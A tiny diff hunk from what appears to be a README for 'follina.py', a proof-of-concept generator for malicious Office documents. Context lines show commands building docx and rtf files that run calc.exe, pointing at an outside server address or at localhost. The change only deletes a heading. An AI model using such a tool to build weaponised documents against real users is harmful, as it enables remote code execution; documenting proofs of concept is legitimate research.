@@ -54,5 +54,3 @@ python .\follina.py -t docx -m binary -b \windows\system32\calc.exe -u 1.2.3.4
 # Only run the webserver on localhost, on port 8080 instead of 80
 python .\follina.py -t rtf -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
 ```
-
-## Cool peeps
